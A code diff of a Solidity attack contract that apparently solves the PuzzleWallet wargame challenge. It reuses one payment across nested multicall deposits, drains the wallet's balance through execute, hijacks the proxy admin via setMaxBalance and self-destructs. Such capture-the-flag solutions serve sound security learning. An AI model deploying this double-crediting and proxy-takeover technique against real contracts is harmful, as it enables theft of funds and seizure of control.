@@ -20,9 +20,34 @@ contract Attack {
         // now puzzleWallet.owner is attacker, add attacker to whitelist
         w.addToWhitelist(address(this));
         // now set maxBalance to hijack admin of proxy to me
+        // we need to firstly withdraw all balance from wallet
+        //   1. balances[attack] should equal wallet.balance, we can achieve this by calling 
+        //      deposit multiple times in the same delegatecall context
+        bytes[] memory data = new bytes[](2);
+        // 1st call deposit
+        data[0] = abi.encodeWithSignature("deposit()");
+        bytes[] memory indcall = new bytes[](1);
+        indcall[0] = abi.encodeWithSignature("deposit()");
+        // 2st call multicall -> deposit
+        data[1] = abi.encodeWithSignature("multicall(bytes[])", indcall);
+
+        require(address(this).balance >= 1000000000000000, "insufficient balance");
+        // this will call deposit twice with only once payment of 0.001 ether by
+        // exploiting a subtile reentrancy vulneraibility in delegatecall
+        w.multicall{value: 1000000000000000}(data);
+        uint balance = w.balances(address(this));
+        require(balance == address(w).balance, "failed stealing money");
+        //   2. withdraw all balance in wallet with wallet.execute
+        w.execute(address(this), balance, "");
+        
+        require(address(w).balance == 0, "money withdraw failed");
+        // finally, set maxBalance to finish attack 
         w.setMaxBalance(uint256(uint160(tx.origin)));
         require(p.admin() == tx.origin, "attack failed.");
+        selfdestruct(tx.origin);
     }
+
+    receive() external payable {}
 }
 
 contract PuzzleProxy is UpgradeableProxy {
